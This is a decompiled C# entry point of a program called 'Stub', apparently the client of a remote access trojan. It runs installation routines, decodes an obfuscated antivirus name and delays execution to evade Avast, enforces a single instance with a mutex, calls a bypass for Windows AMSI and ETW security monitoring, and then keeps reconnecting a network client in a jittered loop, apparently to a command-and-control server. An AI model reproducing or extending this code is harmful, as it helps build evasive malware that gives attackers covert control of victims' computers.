using System;
using System.Threading;
using Stub.Helper;
using Stub.Helper.CryptString;

namespace Stub
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x0000248C File Offset: 0x0000068C
		public static void Vnatyri()
		{
			Settings.Init();
			Install.Start();
			if (Settings.AntiVirus.ToLower().Contains(Caesars.Decoding("avast")))
			{
				Thread.Sleep(60000);
			}
			if (!Methods.CheckForStartCoonnect() || !MutexControl.CreateMutex())
			{
				return;
			}
			AsmiAndETW.Bypass();
			Thread.Sleep(new Random().Next(100, 1000));
			Client client = new Client();
			client.InitializeClient();
			for (;;)
			{
				if (!client.IsConnect)
				{
					client.InitializeClient();
				}
				Thread.Sleep(new Random().Next(100, 1000));
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002070 File Offset: 0x00000270
		private static void Main(string[] args)
		{
			Program.Vnatyri();
			Thread.Sleep(new Random().Next(4000, 6000));
			Methods.Exit();
		}
	}
}
